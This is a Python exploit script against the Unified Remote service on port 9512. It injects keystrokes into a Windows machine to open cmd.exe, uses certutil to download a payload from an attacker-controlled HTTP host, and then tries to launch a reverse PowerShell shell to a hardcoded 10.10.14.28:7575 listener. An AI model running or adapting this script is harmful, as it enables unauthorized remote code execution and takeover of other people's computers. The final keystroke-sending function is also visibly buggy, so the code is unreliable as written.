#!/usr/bin/python
import os
import socket
import sys
from time import sleep

# Packet Data Declarations; Windows, Space and Enter have non-standard values

open1 = ("00000085000108416374696f6e00000550617373776f72640038653831333362332d61313862"
"2d343361662d613763642d6530346637343738323763650005506c6174666f726d00616e64726f696400"
"0852657175657374000005536f7572636500616e64726f69642d64373038653134653532383463623831"
"000356657273696f6e000000000a00").decode("hex")

open_fin = ("000000c8000108416374696f6e0001024361706162696c69746965730004416374696f6e7"
"3000104456e6372797074696f6e3200010446617374000004477269640001044c6f6164696e6700010453"
"796e630001000550617373776f72640064363334633164636664656238373335363038613461313034646"
"5643430373664653736366464363134343336313938303961643766333538353864343439320008526571"
"75657374000105536f7572636500616e64726f69642d643730386531346535323834636238310000"
).decode("hex")

one = ("000000d2000108416374696f6e00070549440052656c6d746563682e4b6579626f61726400024"
"c61796f75740006436f6e74726f6c73000200024f6e416374696f6e0002457874726173000656616c756"
"5730002000556616c756500").decode("hex")

two = ("00000000054e616d6500746f67676c6500000854797065000800000008526571756573740007"
"0252756e0002457874726173000656616c7565730002000556616c756500").decode("hex")

three = ("00000000054e616d6500746f67676c65000005536f7572636500616e64726f69642d643730"
"386531346535323834636238310000").decode("hex")

win_key = ("000000d8000108416374696f6e00070549440052656c6d746563682e4b6579626f61726"
"400024c61796f75740006436f6e74726f6c73000200024f6e416374696f6e000245787472617300065"
"6616c7565730002000556616c7565004c57494e00000000054e616d6500746f67676c6500000854797"
"0650008000000085265717565737400070252756e0002457874726173000656616c756573000200055"
"6616c7565004c57494e00000000054e616d6500746f67676c65000005536f7572636500616e64726f6"
"9642d643730386531346535323834636238310000").decode("hex")

ret_key = ("000000dc000108416374696f6e00070549440052656c6d746563682e4b6579626f6172"
"6400024c61796f75740006436f6e74726f6c73000200024f6e416374696f6e0002457874726173000"
"656616c7565730002000556616c75650052455455524e00000000054e616d6500746f67676c650000"
"08547970650008000000085265717565737400070252756e0002457874726173000656616c7565730"
"002000556616c75650052455455524e00000000054e616d6500746f67676c65000005536f75726365"
"00616e64726f69642d643730386531346535323834636238310000").decode("hex")

space_key = ("000000da000108416374696f6e00070549440052656c6d746563682e4b6579626f6"
"1726400024c61796f75740006436f6e74726f6c73000200024f6e416374696f6e000245787472617"
"3000656616c7565730002000556616c756500535041434500000000054e616d6500746f67676c650"
"00008547970650008000000085265717565737400070252756e0002457874726173000656616c756"
"5730002000556616c756500535041434500000000054e616d6500746f67676c65000005536f75726"
"36500616e64726f69642d643730386531346535323834636238310000").decode("hex")

# ASCII to Hex Conversion Set
characters={
	"A":"41","B":"42","C":"43","D":"44","E":"45","F":"46","G":"47","H":"48","I":"49","J":"4a","K":"4b","L":"4c","M":"4d","N":"4e",
	"O":"4f","P":"50","Q":"51","R":"52","S":"53","T":"54","U":"55","V":"56","W":"57","X":"58","Y":"59","Z":"5a",
	"a":"61","b":"62","c":"63","d":"64","e":"65","f":"66","g":"67","h":"68","i":"69","j":"6a","k":"6b","l":"6c","m":"6d","n":"6e",
	"o":"6f","p":"70","q":"71","r":"72","s":"73","t":"74","u":"75","v":"76","w":"77","x":"78","y":"79","z":"7a",
	"1":"31","2":"32","3":"33","4":"34","5":"35","6":"36","7":"37","8":"38","9":"39","0":"30",
	"+":"2b","=":"3d","/":"2f","_":"5f","<":"3c",
	">":"3e","[":"5b","]":"5d","!":"21","@":"40","#":"23","$":"24","%":"25","^":"5e","&":"26","*":"2a",
	"(":"28",")":"29","-":"2d","'":"27",'"':"22",":":"3a",";":"3b","?":"3f","`":"60","~":"7e",
	"\\":"5c","|":"7c","{":"7b","}":"7d",",":"2c",".":"2e"}

def try_connect(sock, rhost, port):
    try:
        print("[*] Trying to connect to {}:{} using {}".format(rhost, port, sock.type))
        sock.connect((rhost, port))
        print("[+] Connection successful!")
    except socket.error as e:
        print("[-] Connection failed: {}".format(e))
    finally:
        sock.close()

def send_win(target, rhost, port, win_key):
    target.sendto(win_key, (rhost, port))
    target.sendto(win_key, (rhost, port))
    sleep(0.4)

def send_return(target, rhost, port, ret_key):
    target.sendto(ret_key, (rhost, port))
    sleep(0.4)

def send_string(target, string, rhost, port, one, two, three, space_key, characters):
    for char in string:
        if char == " ":
            target.sendto(space_key, (rhost, port))
            sleep(0.02)
        else:
            convert = characters[char].decode("hex")
            target.sendto(one + convert + two + convert + three, (rhost, port))
            sleep(0.02)

def send_string2(target, string, rhost,port):
    for char in string:
        convert = characters[char].decode("hex")
    print(convert)
    target.sendto(convert,(rhost, port))
    sleep(0.02)

def main():
    try:
        rhost = sys.argv[1]
        lhost = sys.argv[2]
        payload = sys.argv[3]
    except IndexError:
        print("Usage: python " + sys.argv[0] + " <target-ip> <local-http-ip> <payload-name>")
        sys.exit(1)
    
    port = 9512
    print("Rhost:", rhost)
    print("Port:", port)
    
    for sock_type in [socket.SOCK_STREAM, socket.SOCK_DGRAM]:
        sock = socket.socket(socket.AF_INET, sock_type)
        try_connect(sock, rhost, port)
        sleep(2)
    
    target = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    print("[+] Connecting to target...")
    print(open1)
    target.sendto(open1, (rhost, port))
    sleep(1)
    target.sendto(open_fin, (rhost, port))
    print("[+] Popping Start Menu")
    sleep(0.02)
    send_win(target, rhost, port, win_key)
    sleep(0.3)
    print("[+] Opening CMD")
    send_string(target, "cmd.exe", rhost, port, one, two, three, space_key, characters)
    sleep(0.3)
    send_return(target, rhost, port, ret_key)
    sleep(0.3)
    print("[+] *Super Fast Hacker Typing*")
    send_string(target, "certutil.exe -f -urlcache http://" + lhost + "/" + payload + " C:\\Windows\\Temp\\" + payload, rhost, port, one, two, three, space_key, characters)
    sleep(0.3)
    print("[+] Downloading Payload")
    send_return(target, rhost, port, ret_key)
    sleep(3)
    send_string2(target, "10.129.96.116 C:\\Windows\\Temp\\" + payload + "-e powershell 10.10.14.28 7575",rhost,port)
    sleep(0.3)
    send_return(target, rhost, port, ret_key)
    print("[+] Done! Check listener?")
    target.close()

if __name__ == "__main__":
    main()
